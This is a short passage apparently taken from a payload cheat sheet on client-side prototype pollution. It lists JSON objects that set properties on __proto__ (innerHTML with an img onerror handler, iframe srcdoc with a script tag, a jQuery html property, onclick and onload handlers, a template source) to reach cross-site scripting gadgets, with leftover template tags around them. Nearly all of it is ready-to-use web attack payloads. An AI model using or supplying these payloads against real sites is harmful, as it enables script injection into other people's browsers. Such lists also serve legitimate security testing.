{"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}

# srcdoc gadget (iframe)
{"__proto__": {"srcdoc": "<script>alert(1)</script>"}}

# jQuery $.fn extension
{"__proto__": {"html": "<script>alert(1)</script>"}}

# Event handler gadgets
{"__proto__": {"onclick": "alert(1)"}}
{"__proto__": {"onload": "alert(1)"}}

# Template literal gadget
{"__proto__": {"source": "malicious template"}}
{% endraw %}
</xss_gadgets>

<dom_gadgets>
{% raw %}
